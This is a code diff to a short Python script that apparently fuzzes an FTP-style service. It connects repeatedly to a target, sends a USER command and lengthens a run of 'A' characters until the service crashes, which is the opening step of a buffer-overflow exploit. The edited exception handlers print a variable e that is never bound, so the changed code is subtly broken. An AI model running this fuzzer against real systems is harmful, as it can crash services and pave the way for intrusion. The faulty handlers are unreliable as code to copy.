@@ -13,7 +13,7 @@ send = lambda s,cmd,payload : s.send((cmd + payload + '\r\n').encode())
 while True:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # s.settimeout(20)
+        s.settimeout(10)
         s.connect((TARGET, PORT))
         s.recv(1024)
         send(s, 'USER', 'test')
@@ -24,7 +24,10 @@ while True:
         s.close()
         buffer = buffer + "A" * 100
         print(len(buffer))
-    except Exception as e:
+    except TimeoutError:
+        print(e)
+        continue
+    except ConnectionRefusedError:
         print(e)
         print(f"Fuzzing crashed at: {len(buffer)}")
         sys.exit()
